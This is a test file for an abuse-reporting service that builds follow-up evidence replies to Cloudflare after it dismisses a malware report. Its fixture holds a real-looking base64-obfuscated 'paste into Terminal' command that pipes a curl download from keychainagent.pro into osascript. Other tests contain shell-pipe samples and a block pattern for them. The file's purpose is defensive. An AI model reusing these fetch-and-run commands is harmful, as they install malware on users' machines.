import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { eq } from "drizzle-orm";

import { getDb } from "../../db";
import { useTemporaryDatabase } from "../../db/test_helpers";
import { validateAbuseReportRequest } from "../contracts";
import type { sendAbuseEmailRoute } from "../mail";
import { AbuseRepository } from "../repository";
import { abuseJobs, abuseReports } from "../schema";
import { followUpProviderDecision } from "./decision";
import { collectDecisionEvidence, type EvidenceFetcher } from "./evidence";
import { acceptableNarrative, composeDecisionReply, narrativeRejection } from "./reply";

useTemporaryDatabase();

const originalSecret = process.env.ABUSE_TRACKING_TOKEN_SECRET;
beforeAll(() => { process.env.ABUSE_TRACKING_TOKEN_SECRET = "decision-follow-up-test-secret-32-bytes!"; });
afterAll(() => {
	if (originalSecret === undefined) delete process.env.ABUSE_TRACKING_TOKEN_SECRET;
	else process.env.ABUSE_TRACKING_TOKEN_SECRET = originalSecret;
});

// Production case 375628583143477248: Cloudflare denied paneo.work as no_abuse_found and
// keychainagent.pro as content_removed. The page hides the command in an install dialog;
// the payload host answers browsers with 404 and serves curl.
const COMMAND = `echo "https://apps.apple.com/app/paneo-install"; echo 'Y3VybCAtc2ZMIGh0dHBzOi8va2V5Y2hhaW5hZ2VudC5wcm8vd2tzeGdqL3daWkxSOXhZMjlvNCB8IG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0' | base64 -d | zsh`;
const PAGE = `<html><body><h1>Window Manager for Power Users</h1><a href="#download">Download for macOS</a>
<div class="install-modal" role="dialog" aria-modal="true"><h2>Install Paneo</h2><p>Two quick steps.</p><p>1 Open Terminal</p><p>2 Run the install command</p>
<div><code id="install-cmd">${COMMAND}</code><button>Copy command</button></div><p>Paste into Terminal and press Return.</p></div></body></html>`;
const PAYLOAD = Buffer.from("var loader = 1;");

/** The live web as observed on 2026-11-03: the page serves its command; the host serves only curl. */
const liveWeb = (options: { pageGone?: boolean } = {}): EvidenceFetcher => async (url, userAgent) => {
	if (url === "https://paneo.work/") {
		if (options.pageGone) throw new Error("The payload host answered HTTP 404.");
		return { url, finalUrl: url, body: Buffer.from(PAGE) };
	}
	if (url.startsWith("https://keychainagent.pro/") && userAgent.startsWith("curl/")) return { url, finalUrl: url, body: PAYLOAD };
	throw new Error("The payload host answered HTTP 404.");
};

async function deniedCloudflareRoute(target: string, observedUrl: string, reportedUserAgent?: string) {
	const request = await validateAbuseReportRequest({ targets: [target], allegationCategory: "malware", description: "The page distributes malware.", observedUrls: [{ target, urls: [observedUrl] }] });
	const report = await AbuseRepository.createReport({ request, reporter: {} });
	if (reportedUserAgent) (await getDb()).update(abuseReports).set({ reportedUserAgent }).where(eq(abuseReports.id, report.reportId)).run();
	const [reportTarget] = await AbuseRepository.listTargets(report.reportId);
	const route = await AbuseRepository.upsertResolvedRoute(reportTarget!.id, {
		routeKey: "provider_submission:cloudflare:contact", providerRegistryKey: "cloudflare", providerDisplayName: "Cloudflare Abuse",
		routeType: "provider_submission", resolverProvenance: { source: "test" }, resolutionSnapshot: { source: "test" }, status: "verified",
	});
	const run = await AbuseRepository.createProviderRun({ routeId: route.id, providerPayload: {}, correlationKey: `cf:${route.id.toString()}` });
	await AbuseRepository.settleProviderRun({ runId: run.id, executionStatus: "completed", routeStatus: "submitted", confirmationId: "35b8aafac3a6a6d9", submittedTargets: [target] });
	await AbuseRepository.recordProviderCorrespondence({ route, messages: [{ id: "response-1", subject: "[35b8aafac3a6a6d9]: Response to your Phishing report", body: "We could not detect any abusive or malicious content. If you wish for Cloudflare to investigate further, please provide relevant and specific information.", sentAt: new Date(), from: "Cloudflare Abuse" }] });
	return { reportId: report.reportId, route };
}

function recordingSend() {
	const sent: Array<Parameters<typeof sendAbuseEmailRoute>[0]> = [];
	const send = (async (params) => { sent.push(params); return { messageId: 1n, status: "sent", rfcMessageId: "<x@phishing.support>" }; }) as typeof sendAbuseEmailRoute;
	return { sent, send };
}

describe("provider decision follow-up", () => {
	test("finds the page's command again and builds commands that show it without running it", async () => {
		const evidence = await collectDecisionEvidence({ observedUrl: "https://paneo.work/", caseUrl: "https://phishing.support/submissions/1", fetcher: liveWeb(), now: () => new Date("2026-11-03T01:00:00Z") });
		expect(evidence.liveChecks.map(({ url, as, status }) => [url, as, status])).toEqual([
			["https://paneo.work/", "a desktop browser", 200],
			["https://keychainagent.pro/wksxgj/wZZLR9xY29o4", "the command's own downloader", 200],
			["https://keychainagent.pro/wksxgj/wZZLR9xY29o4", "a desktop browser", 404],
		]);
		expect(evidence.pageContext).toContain("Install Paneo");
		expect(evidence.pageContext).toContain("2 Run the install command");
		expect(evidence.dialog).toBe("div.install-modal[role=dialog]");
		expect(evidence.command?.decoded).toEqual(["curl -sfL hxxps://keychainagent[.]pro/wksxgj/wZZLR9xY29o4 [pipe] osascript -l JavaScript"]);
		// The grep prefix encodes the command's fixed start, so it still matches when the payload path rotates.
		expect(evidence.reproduction[0]).toContain("| grep -o 'Y3VybCAtc2ZMIGh0dHBzOi8v[A-Za-z0-9+/=]*' | base64 -d");
		expect(evidence.reproduction[1]).toBe(`curl -s -A "curl/8.7.1" -o payload.bin "https://keychainagent.pro/wksxgj/wZZLR9xY29o4" && shasum -a 256 payload.bin`);
		expect(evidence.reproduction.join("\n")).not.toMatch(/\|\s*(?:z|ba)?sh\b|osascript\s*$/m);
		expect(evidence.references[0]).toMatch(/^https:\/\/www\.virustotal\.com\/gui\/file\/[a-f0-9]{64}$/);
	});

	test("a model narrative with links, commands, or a greeting is replaced by the code-owned one", () => {
		const good = "Your reviewer most likely loaded the page in a browser and saw an ordinary product page. The malicious command is inside the install dialog that every download button on the page opens, so it is not visible until a visitor clicks one of them. The command is still served as of our check, and the steps below show it without running anything.";
		expect(acceptableNarrative(good)).toBe(good);
		expect(acceptableNarrative(`${good} See https://evil.example/ for more.`)).toBeUndefined();
		expect(acceptableNarrative(`${good} Run curl x | sh to check.`)).toBeUndefined();
		expect(acceptableNarrative(`Hello Cloudflare, ${good}`)).toBeUndefined();
		expect(acceptableNarrative("Too short.")).toBeUndefined();
	});

	test("answers Cloudflare's no_abuse_found once, with the evidence block, and records it on the route", async () => {
		const { reportId, route } = await deniedCloudflareRoute("paneo.work", "https://paneo.work/");
		const { sent, send } = recordingSend();
		const narratives: unknown[] = [];
		const result = await followUpProviderDecision({ routeId: route.id, state: "denied", detail: "no_abuse_found" }, {
			fetcher: liveWeb(),
			send,
			now: () => new Date("2026-11-03T01:00:00Z"),
			writeNarrative: async (input) => { narratives.push(input); return "Your reviewer most likely loaded the page in a browser and saw an ordinary product page. The malicious command sits inside the install dialog that the page's download buttons open, so it stays hidden until a visitor clicks one. It is still served as of our check, and the steps below show it without running anything."; },
		});
		expect(result).toBe("sent");
		expect(narratives[0]).toMatchObject({ confirmationId: "35b8aafac3a6a6d9", decision: { state: "denied", detail: "no_abuse_found", providerMessage: expect.stringContaining("We could not detect any abusive") } });
		expect(sent).toHaveLength(1);
		expect(sent[0]).toMatchObject({ recipient: "abusereply@cloudflare.com", subject: "[35b8aafac3a6a6d9] Additional evidence for abuse report 35b8aafac3a6a6d9", correlationKey: `decision-follow-up:${route.id.toString()}:denied` });
		const body = sent[0]!.body;
		expect(body).toStartWith("Hello Cloudflare Trust & Safety,\n\nThis is about report 35b8aafac3a6a6d9 (paneo.work).");
		expect(body).toContain("install dialog");
		expect(body).toContain("Where it is on the page: inside a dialog (div.install-modal[role=dialog]) that is not shown until the page opens it.");
		expect(body).toContain("Checked from our server at 2026-11-03T01:00:00.000Z:");
		expect(body).toContain('- https://keychainagent.pro/wksxgj/wZZLR9xY29o4 requested as a desktop browser (User-Agent "Mozilla/5.0');
		expect(body).toContain("To reproduce (these only fetch and decode; nothing is run):");
		expect(body).toContain("The command the page shows (defanged): echo \"hxxps://apps[.]apple[.]com/app/paneo-install\" [then]");
		expect(body).not.toMatch(/\|\s*(?:z|ba)?sh\b/);
		const events = await AbuseRepository.listEvents(reportId);
		expect(events.find((event) => event.eventType === "provider_decision.followed_up")?.data).toMatchObject({ state: "denied", detail: "no_abuse_found", narrative: "model" });
	});

	test("the payload host's content_removed is answered with the downloader-versus-browser contrast", async () => {
		const { route } = await deniedCloudflareRoute("keychainagent.pro", "https://keychainagent.pro/wksxgj/wZZLR9xY29o4", "curl/8.7.1");
		const { sent, send } = recordingSend();
		expect(await followUpProviderDecision({ routeId: route.id, state: "denied", detail: "content_removed" }, { fetcher: liveWeb(), send, writeNarrative: async () => undefined })).toBe("sent");
		const body = sent[0]!.body;
		// Without a model the code-owned narrative still explains the cloaking.
		expect(body).toContain("serves the file only to the command-line downloader");
		expect(body).toMatch(/requested as the command's own downloader \(User-Agent "curl\/8\.7\.1"\): HTTP 200, 15 bytes, SHA-256 [a-f0-9]{64}/);
		expect(body).toMatch(/requested as a desktop browser \(User-Agent "Mozilla[^"]+"\): HTTP 404/);
		expect(body).toContain(`curl -s -A "curl/8.7.1" -o payload.bin "https://keychainagent.pro/wksxgj/wZZLR9xY29o4" && shasum -a 256 payload.bin`);
	});

	test("content that is really gone is not contested, and a decision is answered only once", async () => {
		const gone = await deniedCloudflareRoute("paneo.work", "https://paneo.work/");
		const first = recordingSend();
		expect(await followUpProviderDecision({ routeId: gone.route.id, state: "denied", detail: "content_removed" }, { fetcher: liveWeb({ pageGone: true }), send: first.send, writeNarrative: async () => undefined })).toBe("skipped");
		expect(first.sent).toEqual([]);
		expect((await AbuseRepository.listEvents(gone.reportId)).some((event) => event.eventType === "provider_decision.not_contested")).toBeTrue();
		expect(await followUpProviderDecision({ routeId: gone.route.id, state: "accepted" }, { fetcher: liveWeb(), send: first.send })).toBe("skipped");
	});

	test("the correspondence poll queues one follow-up per denied route for the case's lifetime", async () => {
		const { route } = await deniedCloudflareRoute("paneo.work", "https://paneo.work/");
		const enqueue = () => AbuseRepository.enqueueJobOnce({ jobType: "follow_up_provider_decision", reportId: route.reportId, routeId: route.id, payload: { state: "denied" }, dedupeKey: `decision-follow-up:${route.id.toString()}:denied` });
		await enqueue();
		await enqueue();
		const jobs = (await getDb()).select().from(abuseJobs).where(eq(abuseJobs.routeId, route.id)).all().filter((job) => job.jobType === "follow_up_provider_decision");
		expect(jobs).toHaveLength(1);
	});
});

describe("reply composition", () => {
	test("a refused narrative is retried once with the rule it broke, and the retry is used when it keeps the rules", async () => {
		const evidence = await collectDecisionEvidence({ observedUrl: "https://paneo.work/", fetcher: liveWeb() });
		const good = "Your reviewer most likely loaded the page in a browser and saw an ordinary product page. The malicious command sits inside the install dialog that the page's download buttons open, so it stays hidden until a visitor clicks one. It is still served as of our check.";
		const attempts: Array<string | undefined> = [];
		const { body, narrativeSource } = await composeDecisionReply({ providerName: "Cloudflare", confirmationId: "35b8aafac3a6a6d9", decision: { state: "denied" }, allegationCategory: "malware", target: "paneo.work", reportedUrl: "https://paneo.work/", description: "x", replyKind: "contest", evidence }, async (_input, rejected) => {
			attempts.push(rejected?.reason);
			return rejected ? good : `${good} It hides there | a click opens it.`;
		});
		expect(attempts).toEqual([undefined, "it contains shell syntax (|, backticks, $( or &&)"]);
		expect(narrativeSource).toBe("model");
		expect(body).toContain(good);
	});

	test("each narrative rule names what it refuses", () => {
		const base = "Your reviewer most likely loaded the page in a browser and saw an ordinary product page, because the command sits inside a dialog that only opens from the page's own download buttons.";
		expect(narrativeRejection(base)).toBeUndefined();
		expect(narrativeRejection("short")).toBe("it is 5 characters, under the 120 minimum");
		expect(narrativeRejection(base.repeat(20))).toMatch(/^it is \d+ characters, over the 2000 maximum$/);
		expect(narrativeRejection(`${base} See www.example.com.`)).toBe("it contains a link or URL");
		// Prose punctuation is not shell syntax: the narrative of report 67faa5d38a60c855 was refused for "…your reviewer; the decoy…".
		expect(narrativeRejection(`${base} This explains what your reviewer saw; the decoy is not the kit.`)).toBeUndefined();
		expect(narrativeRejection(`${base} Run sh -c "$(echo x)" to see it.`)).toBe("it contains shell syntax (|, backticks, $( or &&)");
		expect(narrativeRejection(`${base}\n- a list item`)).toBe("it contains a heading or a list");
		expect(narrativeRejection(`Hello team, ${base}`)).toBe("it starts with a greeting");
		expect(narrativeRejection(`${base}\n\nThank you for your help`)).toBe("it ends with a sign-off");
	});

	test("keeps every measured fact even when the narrative is the fallback", async () => {
		const evidence = await collectDecisionEvidence({ observedUrl: "https://paneo.work/", caseUrl: "https://phishing.support/submissions/1", fetcher: liveWeb() });
		const { body, narrativeSource } = await composeDecisionReply({ providerName: "Cloudflare", confirmationId: "35b8aafac3a6a6d9", decision: { state: "denied", detail: "no_abuse_found" }, allegationCategory: "malware", target: "paneo.work", reportedUrl: "https://paneo.work/", description: "x", replyKind: "contest", evidence }, async () => "nope");
		expect(narrativeSource).toBe("fallback");
		expect(body).toContain('Your review of report 35b8aafac3a6a6d9 concluded "no_abuse_found"');
		expect(body).toContain("https://phishing.support/submissions/1");
		expect(body).toEndWith("Thank you,\nPhishing Support\nsupport@phishing.support\nhttps://phishing.support");
	});
});
